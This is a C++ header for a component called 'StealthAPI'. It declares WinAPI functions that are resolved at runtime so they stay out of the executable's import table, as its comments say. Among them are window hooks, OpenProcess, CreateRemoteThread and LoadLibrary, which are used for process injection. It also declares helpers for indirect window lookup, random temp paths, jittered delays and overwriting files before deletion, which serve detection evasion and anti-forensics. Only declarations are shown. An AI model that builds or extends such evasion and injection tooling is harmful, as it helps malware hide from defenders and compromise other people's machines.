#pragma once
#include <Windows.h>
#include <string>
#include <vector>
#include <random>

// ============================================================
// Dynamic API Resolution — resolves WinAPI functions at runtime
// to avoid suspicious static imports in the PE import table
// ============================================================

namespace StealthAPI {

    // ---- Type definitions for dynamically resolved functions ----

    // user32.dll
    typedef HHOOK(WINAPI* pfnSetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
    typedef BOOL(WINAPI* pfnUnhookWindowsHookEx)(HHOOK);
    typedef BOOL(WINAPI* pfnPostMessageW)(HWND, UINT, WPARAM, LPARAM);
    typedef BOOL(WINAPI* pfnPostThreadMessageW)(DWORD, UINT, WPARAM, LPARAM);
    typedef LRESULT(WINAPI* pfnSendMessageTimeoutW)(HWND, UINT, WPARAM, LPARAM, UINT, UINT, PDWORD_PTR);
    typedef BOOL(WINAPI* pfnEnumWindows)(WNDENUMPROC, LPARAM);
    typedef int(WINAPI* pfnGetClassNameW)(HWND, LPWSTR, int);
    typedef DWORD(WINAPI* pfnGetWindowThreadProcessId)(HWND, LPDWORD);
    typedef BOOL(WINAPI* pfnIsWindow)(HWND);

    // kernel32.dll
    typedef HMODULE(WINAPI* pfnLoadLibraryExW)(LPCWSTR, HANDLE, DWORD);
    typedef FARPROC(WINAPI* pfnGetProcAddress)(HMODULE, LPCSTR);
    typedef BOOL(WINAPI* pfnFreeLibrary)(HMODULE);
    typedef HANDLE(WINAPI* pfnOpenProcess)(DWORD, BOOL, DWORD);
    typedef HANDLE(WINAPI* pfnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef BOOL(WINAPI* pfnTerminateProcess)(HANDLE, UINT);
    typedef HMODULE(WINAPI* pfnLoadLibraryW)(LPCWSTR);

    // ---- Resolved function pointers (initialized on first use) ----

    // Initialize all function pointers — call once at startup
    bool Initialize();

    // Resolved pointers (accessible after Initialize())
    extern pfnSetWindowsHookExW     pSetWindowsHookExW;
    extern pfnUnhookWindowsHookEx   pUnhookWindowsHookEx;
    extern pfnPostMessageW          pPostMessageW;
    extern pfnPostThreadMessageW    pPostThreadMessageW;
    extern pfnSendMessageTimeoutW   pSendMessageTimeoutW;
    extern pfnEnumWindows           pEnumWindows;
    extern pfnGetClassNameW         pGetClassNameW;
    extern pfnGetWindowThreadProcessId pGetWindowThreadProcessId;
    extern pfnIsWindow              pIsWindow;
    extern pfnLoadLibraryExW        pLoadLibraryExW;
    extern pfnGetProcAddress        pGetProcAddress;
    extern pfnFreeLibrary           pFreeLibrary;
    extern pfnOpenProcess           pOpenProcess;
    extern pfnCreateRemoteThread    pCreateRemoteThread;
    extern pfnTerminateProcess      pTerminateProcess;
    extern pfnLoadLibraryW          pLoadLibraryW;
}

// ============================================================
// Masked Window Enumeration
// Uses EnumWindows + GetClassNameW instead of FindWindowW
// ============================================================

// Find a window by class name using indirect enumeration
// Returns the HWND if found, NULL otherwise
HWND StealthFindWindow(const std::wstring& className);

// ============================================================
// Random Temp Filename Generation
// ============================================================

// Generate a random temp file path with the given extension
// e.g. "C:\Users\...\AppData\Local\Temp\tmp8A3F1B2C.tmp"
std::wstring GenerateRandomTempPath(const std::wstring& extension = L".tmp");

// ============================================================
// Jittered Delay
// ============================================================

// Sleep for a random duration between minMs and maxMs
void JitteredSleep(DWORD minMs, DWORD maxMs);

// ============================================================
// Secure File Deletion
// ============================================================

// Overwrite file contents with random data before deleting
bool SecureDeleteFile(const std::wstring& filePath);
